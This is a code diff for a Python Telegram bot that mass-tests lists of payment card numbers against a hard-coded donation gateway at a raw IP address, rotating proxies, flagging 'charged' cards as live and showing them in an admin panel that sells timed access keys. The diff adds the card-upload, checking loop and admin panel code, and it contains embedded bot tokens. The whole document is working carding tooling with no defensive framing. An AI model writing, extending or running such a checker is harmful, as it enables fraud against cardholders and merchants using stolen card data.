@@ -6,7 +6,7 @@ import string
 from datetime import datetime, timedelta
 import sys
 
-bot = TeleBot("8663863938:AAEf7TUyJfwhOGxCsY6yfSzNl-oRUV4hPmU")
+bot = TeleBot("7700737624:AAEKOb2kJFTN6g-Cod4vDphfpqlJSsjzoHU")
 
 GATEWAY = "http://138.128.240.15:8025/paypal_donate?cc="
 
@@ -16,6 +16,9 @@ allowed_users = {}
 active_keys = {}
 live_cards = []
 stop_flags = {}
+
+# Admin auto access
+allowed_users[ADMIN_ID] = datetime.now() + timedelta(days=999)
 
 proxies_list = [
     "http://148.230.4.241:999",
@@ -49,7 +52,7 @@ def start(m):
         print_log(f"User {user_id} started bot - Access Granted")
     else:
         bot.send_message(m.chat.id, "🔐 **Access Declined**\n\nKey redeem karo: `/redeem <key>`")
-        print_log(f"User {user_id} tried to start - Access Declined")
+        print_log(f"User {user_id} tried - Access Declined")
 
 @bot.message_handler(commands=['redeem'])
 def redeem_key(m):
@@ -66,30 +69,108 @@ def redeem_key(m):
         bot.reply_to(m, "❌ **Invalid or Expired Key**")
         print_log(f"User {m.from_user.id} tried invalid key")
 
-# Admin Panel (same as before)
-# ... (paste your admin panel code here)
+@bot.message_handler(commands=['admin'])
+def admin_panel(m):
+    if m.from_user.id != ADMIN_ID:
+        bot.reply_to(m, "❌ Admin only")
+        return
 
-# Mass Check with txt (same as before with logs)
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🔑 30 Days Key", callback_data="gen_key_30"),
+        types.InlineKeyboardButton("🔑 7 Days Key", callback_data="gen_key_7"),
+        types.InlineKeyboardButton("👥 User List", callback_data="user_list"),
+        types.InlineKeyboardButton("💳 Live Cards", callback_data="show_live")
+    )
+    bot.send_message(m.chat.id, "🛠 **Admin Panel**", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: True)
+def admin_callback(call):
+    if call.from_user.id != ADMIN_ID:
+        return
+
+    if call.data == "gen_key_30":
+        key = generate_key()
+        expiry = datetime.now() + timedelta(days=30)
+        active_keys[key] = expiry
+        bot.send_message(call.message.chat.id, f"✅ **30 Days Key**\n`{key}`\nExpiry: {expiry.strftime('%Y-%m-%d')}")
+        print_log(f"Admin generated 30 days key")
+
+    elif call.data == "gen_key_7":
+        key = generate_key()
+        expiry = datetime.now() + timedelta(days=7)
+        active_keys[key] = expiry
+        bot.send_message(call.message.chat.id, f"✅ **7 Days Key**\n`{key}`\nExpiry: {expiry.strftime('%Y-%m-%d')}")
+        print_log(f"Admin generated 7 days key")
+
+    elif call.data == "user_list":
+        if not allowed_users:
+            bot.send_message(call.message.chat.id, "Koi active user nahi")
+        else:
+            text = "👥 **Active Users:**\n\n"
+            for uid, exp in allowed_users.items():
+                text += f"ID: `{uid}` | Expiry: {exp.strftime('%Y-%m-%d')}\n"
+            bot.send_message(call.message.chat.id, text)
+
+    elif call.data == "show_live":
+        if not live_cards:
+            bot.send_message(call.message.chat.id, "Koi live card nahi")
+        else:
+            text = "💳 **Live Cards:**\n\n" + "\n".join(live_cards[-30:])
+            bot.send_message(call.message.chat.id, text)
+
+# Mass Check
+@bot.message_handler(commands=['chk'])
+def chk_file(m):
+    bot.send_message(m.chat.id, "📁 Cards wali .txt file bhej")
+
 @bot.message_handler(content_types=['document'])
 def handle_file(m):
-    # ... file handling ...
+    if not m.document.file_name.endswith('.txt'):
+        bot.reply_to(m, "Sirf .txt file bhej")
+        return
+
+    file_info = bot.get_file(m.document.file_id)
+    downloaded = bot.download_file(file_info.file_path)
+    cards = [line.strip() for line in downloaded.decode('utf-8').splitlines() if line.strip()]
+
+    if not cards:
+        bot.reply_to(m, "File empty hai")
+        return
+
+    stop_flags[m.chat.id] = False
+    live = 0
+    dead = 0
+
+    progress_msg = bot.send_message(m.chat.id, "🔄 Starting check...")
+
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🛑 Stop", callback_data="stop_check"))
 
     print_log(f"Mass check started with {len(cards)} cards by user {m.from_user.id}")
 
     for i, card in enumerate(cards):
         if stop_flags.get(m.chat.id):
+            bot.edit_message_text("🛑 Stopped by user", m.chat.id, progress_msg.message_id)
             print_log("Mass check stopped by user")
             break
 
         proxy = get_proxy()
-        print_log(f"Checking card {i+1}/{len(cards)}: {card}")
+
+        bot.edit_message_text(
+            f"💳 **Current card:**\n`{card}`\n\n"
+            f"📊 **Status:** Checking...\n"
+            f"💎 **Charged:** {live}\n"
+            f"❌ **Declined:** {dead}\n"
+            f"📊 **Total:** {len(cards)}",
+            m.chat.id, progress_msg.message_id,
+            reply_markup=markup
+        )
 
         try:
             url = GATEWAY + card.replace(" ", "")
             r = requests.get(url, proxies=proxy, timeout=20)
             resp = r.text
-
-            print_log(f"Response for {card[:8]}****: {resp[:150]}...")
 
             if any(x in resp.lower() for x in ["charge", "charged", "approved", "success", "live"]):
                 live += 1
@@ -106,6 +187,20 @@ def handle_file(m):
 
         time.sleep(1.2)
 
+    bot.edit_message_text(
+        f"✅ **CHECKING COMPLETE**\n\n"
+        f"💎 **Charged:** {live}\n"
+        f"❌ **Declined:** {dead}\n"
+        f"📊 **Total:** {len(cards)}",
+        m.chat.id, progress_msg.message_id
+    )
+
     print_log(f"Mass check finished. Charged: {live} | Dead: {dead}")
+
+@bot.callback_query_handler(func=lambda call: call.data == "stop_check")
+def stop_check(call):
+    stop_flags[call.message.chat.id] = True
+    bot.answer_callback_query(call.id, "Stopping...")
+    print_log("Stop button pressed")
 
 bot.infinity_polling()
